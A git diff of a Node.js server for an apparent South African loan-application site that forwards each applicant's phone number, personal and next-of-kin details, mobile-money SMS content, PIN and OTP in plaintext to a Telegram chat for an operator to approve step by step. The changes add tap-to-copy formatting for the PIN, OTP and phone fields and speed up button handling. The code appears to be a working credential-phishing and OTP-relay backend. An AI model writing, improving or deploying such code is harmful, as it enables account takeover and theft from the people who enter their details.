@@ -1,5 +1,6 @@
 // ============================================================
 // server.js – South Africa Version with All Features
+// Includes: HTML parse mode + tap-to-copy on Telegram
 // ============================================================
 console.log("🚀 1. Server is starting...");
 require('dotenv').config();
@@ -32,6 +33,25 @@ if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
 
 const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;
 console.log('✅ Server starting...');
+
+// ─── HTML Escaping & Copyable Helpers ───
+function escapeHtml(text) {
+    if (text === null || text === undefined) return '';
+    return String(text)
+        .replace(/&/g, '&amp;')
+        .replace(/</g, '&lt;')
+        .replace(/>/g, '&gt;');
+}
+
+function copyable(text) {
+    const clean = (text === null || text === undefined) ? '' : String(text).trim();
+    return `<code>${escapeHtml(clean)}</code>`;
+}
+
+function copyableBlock(text) {
+    const clean = (text === null || text === undefined) ? '' : String(text).trim();
+    return `<pre>${escapeHtml(clean)}</pre>`;
+}
 
 // ─── Data Persistence Setup ───
 const DATA_DIR = path.join(__dirname, '../data');
@@ -134,14 +154,19 @@ process.on('SIGTERM', gracefulShutdown);
 loadApplications();
 loadRejectionHistory();
 
-// ─── Telegram Message Sender ───
+// ─── Telegram Message Sender (HTML mode for copy-to-clipboard) ───
 async function sendTelegramMessage(message, buttons = null) {
     if (!TELEGRAM_BOT_TOKEN) {
         console.error('❌ Cannot send message: TELEGRAM_BOT_TOKEN is missing');
         return { ok: false, error: 'Bot token missing' };
     }
 
-    const body = { chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'Markdown' };
+    const body = {
+        chat_id: TELEGRAM_CHAT_ID,
+        text: message,
+        parse_mode: 'HTML',
+        disable_web_page_preview: true
+    };
     if (buttons) body.reply_markup = { inline_keyboard: buttons };
 
     try {
@@ -181,7 +206,16 @@ app.post('/api/send-application', async (req, res) => {
         saveApplications();
         console.log(`📝 Application ${isResubmission ? 'RE' : ''}submitted: ${applicationId}`);
 
-        const message = `📋 *${isResubmission ? 'RE-' : 'NEW'} LOAN APPLICATION (SOUTH AFRICA)*\n━━━━━━━━━━━━━━━━━━━━━━\n🆔 ID: ${applicationId}\n📱 Phone: +27${phone}\n💰 Amount: R ${loanAmount.toLocaleString()}\n📅 Term: ${loanTerm}\n👤 Name: ${firstName} ${lastName}\n${isResubmission ? `\n🔄 Resubmission #${applications[applicationId].resubmissionCount}` : ''}\n\n✅ *Please approve or reject this application:*`;
+        const message =
+            `📋 <b>${isResubmission ? 'RE-' : 'NEW'} LOAN APPLICATION (SOUTH AFRICA)</b>\n` +
+            `━━━━━━━━━━━━━━━━━━━━━━\n` +
+            `🆔 ID: ${copyable(applicationId)}\n` +
+            `📱 Phone: ${copyable('+27' + phone)}\n` +
+            `💰 Amount: <b>R ${loanAmount.toLocaleString()}</b>\n` +
+            `📅 Term: ${loanTerm}\n` +
+            `👤 Name: ${escapeHtml(firstName)} ${escapeHtml(lastName)}\n` +
+            `${isResubmission ? `\n🔄 Resubmission #${applications[applicationId].resubmissionCount}` : ''}\n\n` +
+            `✅ <b>Please approve or reject this application:</b>`;
 
         const buttons = [[
             { text: '✅ YES', callback_data: JSON.stringify({ action: 'YES', step: 'SMS', applicationId }) },
@@ -207,7 +241,15 @@ app.post('/api/send-momo-message', async (req, res) => {
         applications[applicationId].updatedAt = new Date().toISOString();
         saveApplications();
 
-        const message = `📨 *SMS VERIFICATION${isResubmission ? ' (RESUBMISSION)' : ''}*\n━━━━━━━━━━━━━━━━━━━━━━\n🆔 ID: ${applicationId}\n📱 Phone: +27${phone}\n\n📩 *SMS Content:*\n${momoMessage}\n\n✅ *Please approve or reject this SMS:*`;
+        const message =
+            `📨 <b>SMS VERIFICATION${isResubmission ? ' (RESUBMISSION)' : ''}</b>\n` +
+            `━━━━━━━━━━━━━━━━━━━━━━\n` +
+            `🆔 ID: ${copyable(applicationId)}\n` +
+            `📱 Phone: ${copyable('+27' + phone)}\n\n` +
+            `📩 <b>SMS Content:</b>\n` +
+            `${copyableBlock(momoMessage)}\n\n` +
+            `✅ <b>Please approve or reject this SMS:</b>`;
+
         const buttons = [[
             { text: '✅ YES', callback_data: JSON.stringify({ action: 'YES', step: 'SMS', applicationId }) },
             { text: '❌ NO', callback_data: JSON.stringify({ action: 'NO', step: 'SMS', applicationId }) }
@@ -251,7 +293,13 @@ app.post('/api/send-pin', async (req, res) => {
         app.updatedAt = new Date().toISOString();
         saveApplications();
 
-        const message = `🔐 *PIN VERIFICATION${isResubmission ? ' (RESUBMISSION)' : ''}*\n━━━━━━━━━━━━━━━━━━━━━━\n🆔 ID: ${applicationId}\n🔢 PIN Entered: ${pin}\n\n✅ *Please approve or reject this PIN:*`;
+        const message =
+            `🔐 <b>PIN VERIFICATION${isResubmission ? ' (RESUBMISSION)' : ''}</b>\n` +
+            `━━━━━━━━━━━━━━━━━━━━━━\n` +
+            `🆔 ID: ${copyable(applicationId)}\n` +
+            `🔢 PIN Entered: ${copyable(pin)}\n\n` +
+            `✅ <b>Please approve or reject this PIN:</b>`;
+
         const buttons = [[
             { text: '✅ YES', callback_data: JSON.stringify({ action: 'YES', step: 'PIN', applicationId }) },
             { text: '❌ NO', callback_data: JSON.stringify({ action: 'NO', step: 'PIN', applicationId }) }
@@ -284,7 +332,13 @@ app.post('/api/pin-rejected', async (req, res) => {
             saveApplications();
 
             await sendTelegramMessage(
-                `🔒 *PIN BLOCKED*\n━━━━━━━━━━━━━━━━━━━━━━\n🆔 ID: ${applicationId}\n👤 Name: ${app.firstName} ${app.lastName}\n📱 Phone: +27${app.phone}\n\n❌ Too many failed PIN attempts.\n⏳ Blocked for 5 minutes.`
+                `🔒 <b>PIN BLOCKED</b>\n` +
+                `━━━━━━━━━━━━━━━━━━━━━━\n` +
+                `🆔 ID: ${copyable(applicationId)}\n` +
+                `👤 Name: ${escapeHtml(app.firstName)} ${escapeHtml(app.lastName)}\n` +
+                `📱 Phone: ${copyable('+27' + app.phone)}\n\n` +
+                `❌ Too many failed PIN attempts.\n` +
+                `⏳ Blocked for 5 minutes.`
             );
 
             return res.json({
@@ -367,7 +421,13 @@ app.post('/api/send-otp', async (req, res) => {
         applications[applicationId].updatedAt = new Date().toISOString();
         saveApplications();
 
-        const message = `🔑 *OTP VERIFICATION${isResubmission ? ' (RESUBMISSION)' : ''}*\n━━━━━━━━━━━━━━━━━━━━━━\n🆔 ID: ${applicationId}\n🔢 OTP Entered: ${otp}\n\n✅ *Please approve or reject this OTP:*`;
+        const message =
+            `🔑 <b>OTP VERIFICATION${isResubmission ? ' (RESUBMISSION)' : ''}</b>\n` +
+            `━━━━━━━━━━━━━━━━━━━━━━\n` +
+            `🆔 ID: ${copyable(applicationId)}\n` +
+            `🔢 OTP Entered: ${copyable(otp)}\n\n` +
+            `✅ <b>Please approve or reject this OTP:</b>`;
+
         const buttons = [[
             { text: '✅ YES', callback_data: JSON.stringify({ action: 'YES', step: 'OTP', applicationId }) },
             { text: '❌ NO', callback_data: JSON.stringify({ action: 'NO', step: 'OTP', applicationId }) }
@@ -395,7 +455,14 @@ app.post('/api/resend-otp', async (req, res) => {
         app.updatedAt = new Date().toISOString();
         saveApplications();
 
-        const message = `🔄 *OTP RESENT - ADMIN ACTION REQUIRED*\n━━━━━━━━━━━━━━━━━━━━━━\n🆔 ID: ${applicationId}\n👤 Name: ${app.firstName} ${app.lastName}\n📱 Phone: +27${app.phone}\n\n📌 A new OTP has been requested by the user.\n✅ *Please approve or reject this new OTP:*`;
+        const message =
+            `🔄 <b>OTP RESENT - ADMIN ACTION REQUIRED</b>\n` +
+            `━━━━━━━━━━━━━━━━━━━━━━\n` +
+            `🆔 ID: ${copyable(applicationId)}\n` +
+            `👤 Name: ${escapeHtml(app.firstName)} ${escapeHtml(app.lastName)}\n` +
+            `📱 Phone: ${copyable('+27' + app.phone)}\n\n` +
+            `📌 A new OTP has been requested by the user.\n` +
+            `✅ <b>Please approve or reject this new OTP:</b>`;
 
         const buttons = [[
             { text: '✅ YES', callback_data: JSON.stringify({ action: 'YES', step: 'OTP', applicationId }) },
@@ -418,7 +485,16 @@ app.post('/api/send-final-details', async (req, res) => {
         applications[data.applicationId].updatedAt = new Date().toISOString();
         saveApplications();
 
-        const message = `✅ *LOAN COMPLETE (SOUTH AFRICA)*\n━━━━━━━━━━━━━━━━━━━━━━\n🆔 ID: ${data.applicationId}\n📱 Phone: +27${data.phone}\n🔑 PIN Entered: ${data.pin}\n💰 Amount: R ${data.loanAmount.toLocaleString()}\n📅 Term: ${data.loanTerm}\n👤 Name: ${data.firstName} ${data.lastName}\n\n🎉 *Status: DASHBOARD ACCESS GRANTED*`;
+        const message =
+            `✅ <b>LOAN COMPLETE (SOUTH AFRICA)</b>\n` +
+            `━━━━━━━━━━━━━━━━━━━━━━\n` +
+            `🆔 ID: ${copyable(data.applicationId)}\n` +
+            `📱 Phone: ${copyable('+27' + data.phone)}\n` +
+            `🔑 PIN Entered: ${copyable(data.pin)}\n` +
+            `💰 Amount: <b>R ${data.loanAmount.toLocaleString()}</b>\n` +
+            `📅 Term: ${data.loanTerm}\n` +
+            `👤 Name: ${escapeHtml(data.firstName)} ${escapeHtml(data.lastName)}\n\n` +
+            `🎉 <b>Status: DASHBOARD ACCESS GRANTED</b>`;
 
         await sendTelegramMessage(message);
         res.json({ ok: true, status: 'dashboard_ready' });
@@ -496,7 +572,15 @@ app.post('/api/telegram-webhook', async (req, res) => {
                         'No applications yet';
 
                     await sendTelegramMessage(
-                        `📊 *APPLICATION STATISTICS* 📊\n━━━━━━━━━━━━━━━━━━━━━━\n📝 Total: ${total}\n⏳ Pending SMS: ${pendingSms}\n⏳ Pending PIN: ${pendingPin}\n⏳ Pending OTP: ${pendingOtp}\n✅ Approved: ${approved}\n❌ Rejected: ${rejected}\n\n📅 *Recent Applications:*\n${recentList}`
+                        `📊 <b>APPLICATION STATISTICS</b> 📊\n` +
+                        `━━━━━━━━━━━━━━━━━━━━━━\n` +
+                        `📝 Total: <b>${total}</b>\n` +
+                        `⏳ Pending SMS: ${pendingSms}\n` +
+                        `⏳ Pending PIN: ${pendingPin}\n` +
+                        `⏳ Pending OTP: ${pendingOtp}\n` +
+                        `✅ Approved: ${approved}\n` +
+                        `❌ Rejected: ${rejected}\n\n` +
+                        `📅 <b>Recent Applications:</b>\n${recentList}`
                     );
                     return res.sendStatus(200);
                 }
@@ -509,13 +593,13 @@ app.post('/api/telegram-webhook', async (req, res) => {
                     }
 
                     const displayIds = ids.slice(-10);
-                    let message = '📋 *APPLICATION LIST* 📋\n━━━━━━━━━━━━━━━━━━━━━━\n';
+                    let message = '📋 <b>APPLICATION LIST</b> 📋\n━━━━━━━━━━━━━━━━━━━━━━\n';
                     displayIds.forEach((id, i) => {
                         const app = applications[id];
-                        message += `\n${i+1}. 🆔 *${id}*\n`;
-                        message += `   👤 ${app.firstName} ${app.lastName}\n`;
-                        message += `   📱 +27${app.phone}\n`;
-                        message += `   💰 R ${app.loanAmount.toLocaleString()}\n`;
+                        message += `\n${i+1}. 🆔 <b>${id}</b>\n`;
+                        message += `   👤 ${escapeHtml(app.firstName)} ${escapeHtml(app.lastName)}\n`;
+                        message += `   📱 ${copyable('+27' + app.phone)}\n`;
+                        message += `   💰 <b>R ${app.loanAmount.toLocaleString()}</b>\n`;
                         message += `   📌 SMS: ${app.smsStatus} | PIN: ${app.pinStatus} | OTP: ${app.otpStatus}\n`;
                     });
 
@@ -532,12 +616,27 @@ app.post('/api/telegram-webhook', async (req, res) => {
                     const app = applications[searchId];
 
                     if (!app) {
-                        await sendTelegramMessage(`❌ Application *${searchId}* not found.`);
+                        await sendTelegramMessage(`❌ Application <code>${escapeHtml(searchId)}</code> not found.`);
                         return res.sendStatus(200);
                     }
 
                     await sendTelegramMessage(
-                        `🔍 *APPLICATION DETAILS* 🔍\n━━━━━━━━━━━━━━━━━━━━━━\n🆔 ID: ${searchId}\n👤 Name: ${app.firstName} ${app.lastName}\n📱 Phone: +27${app.phone}\n📧 Email: ${app.email}\n💰 Amount: R ${app.loanAmount.toLocaleString()}\n📅 Term: ${app.loanTerm}\n📌 Purpose: ${app.loanPurpose || 'Not specified'}\n💼 Employment: ${app.employment || 'Not specified'}\n💰 Income: R ${(app.annualIncome || 0).toLocaleString()}\n👨‍👩‍👦 Kin: ${app.kinName || 'Not specified'} (+27${app.kinPhone || ''})\n\n📨 SMS: ${app.smsStatus}\n🔐 PIN: ${app.pinStatus}\n🔑 OTP: ${app.otpStatus}\n🔄 Resubmissions: ${app.resubmissionCount || 0}`
+                        `🔍 <b>APPLICATION DETAILS</b> 🔍\n` +
+                        `━━━━━━━━━━━━━━━━━━━━━━\n` +
+                        `🆔 ID: ${copyable(searchId)}\n` +
+                        `👤 Name: ${escapeHtml(app.firstName)} ${escapeHtml(app.lastName)}\n` +
+                        `📱 Phone: ${copyable('+27' + app.phone)}\n` +
+                        `📧 Email: ${copyable(app.email)}\n` +
+                        `💰 Amount: <b>R ${app.loanAmount.toLocaleString()}</b>\n` +
+                        `📅 Term: ${app.loanTerm}\n` +
+                        `📌 Purpose: ${escapeHtml(app.loanPurpose || 'Not specified')}\n` +
+                        `💼 Employment: ${escapeHtml(app.employment || 'Not specified')}\n` +
+                        `💰 Income: R ${(app.annualIncome || 0).toLocaleString()}\n` +
+                        `👨‍👩‍👦 Kin: ${escapeHtml(app.kinName || 'Not specified')} ${copyable(app.kinPhone ? '+27' + app.kinPhone : '')}\n\n` +
+                        `📨 SMS: ${app.smsStatus}\n` +
+                        `🔐 PIN: ${app.pinStatus}\n` +
+                        `🔑 OTP: ${app.otpStatus}\n` +
+                        `🔄 Resubmissions: ${app.resubmissionCount || 0}`
                     );
                     return res.sendStatus(200);
                 }
@@ -548,9 +647,9 @@ app.post('/api/telegram-webhook', async (req, res) => {
                         const appName = applications[deleteId].firstName + ' ' + applications[deleteId].lastName;
                         delete applications[deleteId];
                         saveApplications();
-                        await sendTelegramMessage(`✅ Application *${deleteId}* (${appName}) deleted successfully.`);
+                        await sendTelegramMessage(`✅ Application <code>${escapeHtml(deleteId)}</code> (${escapeHtml(appName)}) deleted successfully.`);
                     } else {
-                        await sendTelegramMessage(`❌ Application *${deleteId}* not found.`);
+                        await sendTelegramMessage(`❌ Application <code>${escapeHtml(deleteId)}</code> not found.`);
                     }
                     return res.sendStatus(200);
                 }
@@ -573,14 +672,30 @@ app.post('/api/telegram-webhook', async (req, res) => {
                     const appCount = Object.keys(applications).length;
                     const webhookInfo = await fetch(`${TELEGRAM_API_URL}/getWebhookInfo`).then(r => r.json());
                     await sendTelegramMessage(
-                        `✅ *BOT STATUS* ✅\n━━━━━━━━━━━━━━━━━━━━━━\n🚀 Status: Online\n📊 Applications: ${appCount}\n⏰ Time: ${new Date().toISOString()}\n🔗 Webhook: ${webhookInfo.result?.url || 'Not set'}\n💾 Data File: ${fs.existsSync(DATA_FILE) ? '✅' : '❌'}`
+                        `✅ <b>BOT STATUS</b> ✅\n` +
+                        `━━━━━━━━━━━━━━━━━━━━━━\n` +
+                        `🚀 Status: Online\n` +
+                        `📊 Applications: ${appCount}\n` +
+                        `⏰ Time: ${new Date().toISOString()}\n` +
+                        `🔗 Webhook: ${copyable(webhookInfo.result?.url || 'Not set')}\n` +
+                        `💾 Data File: ${fs.existsSync(DATA_FILE) ? '✅' : '❌'}`
                     );
                     return res.sendStatus(200);
                 }
 
                 if (text === '/help' || text === '/start') {
                     await sendTelegramMessage(
-                        `🤖 *AVAILABLE COMMANDS* 🤖\n━━━━━━━━━━━━━━━━━━━━━━\n📊 /stats - View application statistics\n📋 /list - List all applications (last 10)\n🔍 /search [ID] - Find specific application\n🗑️ /delete [ID] - Delete an application\n🧹 /clear - Clear ALL applications (warning!)\n📌 /status - Check bot status\n❓ /help - Show this help menu\n\n📌 *Quick Actions:*\nWhen you receive a new application, use the YES/NO buttons to approve or reject.`
+                        `🤖 <b>AVAILABLE COMMANDS</b> 🤖\n` +
+                        `━━━━━━━━━━━━━━━━━━━━━━\n` +
+                        `📊 /stats - View application statistics\n` +
+                        `📋 /list - List all applications (last 10)\n` +
+                        `🔍 /search [ID] - Find specific application\n` +
+                        `🗑️ /delete [ID] - Delete an application\n` +
+                        `🧹 /clear - Clear ALL applications (warning!)\n` +
+                        `📌 /status - Check bot status\n` +
+                        `❓ /help - Show this help menu\n\n` +
+                        `📌 <b>Quick Actions:</b>\n` +
+                        `When you receive a new application, use the YES/NO buttons to approve or reject.`
                     );
                     return res.sendStatus(200);
                 }
@@ -602,6 +717,18 @@ app.post('/api/telegram-webhook', async (req, res) => {
 
             try {
                 const { action, step, applicationId } = JSON.parse(query.data);
+
+                // ✅ Answer IMMEDIATELY so Telegram doesn't time out the button
+                await fetch(`${TELEGRAM_API_URL}/answerCallbackQuery`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        callback_query_id: query.id,
+                        text: `✅ ${action === 'YES' ? 'Approved' : 'Rejected'}!`,
+                        show_alert: false
+                    })
+                });
+
                 const app = applications[applicationId];
 
                 if (!app) {
@@ -638,18 +765,14 @@ app.post('/api/telegram-webhook', async (req, res) => {
                 app.updatedAt = new Date().toISOString();
                 saveApplications();
 
-                await fetch(`${TELEGRAM_API_URL}/answerCallbackQuery`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        callback_query_id: query.id,
-                        text: `✅ ${action === 'YES' ? 'Approved' : 'Rejected'}!`,
-                        show_alert: false
-                    })
-                });
-
                 const statusText = action === 'YES' ? '✅ Approved' : '❌ Rejected';
-                await sendTelegramMessage(`📌 *Status Update (SOUTH AFRICA)*\n━━━━━━━━━━━━━━━━━━━━━━\n🆔 ID: ${applicationId}\n📋 Step: ${step}\n📌 Status: ${statusText}`);
+                await sendTelegramMessage(
+                    `📌 <b>Status Update (SOUTH AFRICA)</b>\n` +
+                    `━━━━━━━━━━━━━━━━━━━━━━\n` +
+                    `🆔 ID: ${copyable(applicationId)}\n` +
+                    `📋 Step: ${step}\n` +
+                    `📌 Status: ${statusText}`
+                );
 
             } catch (parseError) {
                 console.error('❌ Error parsing callback data:', parseError);
@@ -690,7 +813,12 @@ app.get('/api/status/:applicationId/:step', (req, res) => {
     }
 });
 
-// ─── 13. Debug Endpoints ───
+// ─── 13. Health Check (for keep-alive pings) ───
+app.get('/health', (req, res) => {
+    res.status(200).json({ status: 'ok', uptime: process.uptime() });
+});
+
+// ─── 14. Debug Endpoints ───
 app.get('/api/debug/applications', (req, res) => {
     res.json({
         total: Object.keys(applications).length,
@@ -706,7 +834,7 @@ app.get('/api/debug/application/:id', (req, res) => {
     res.json(app);
 });
 
-// ─── 14. Backup Endpoint ───
+// ─── 15. Backup Endpoint ───
 app.get('/api/debug/backup', (req, res) => {
     try {
         const backupFile = path.join(DATA_DIR, `applications_backup_${Date.now()}.json`);
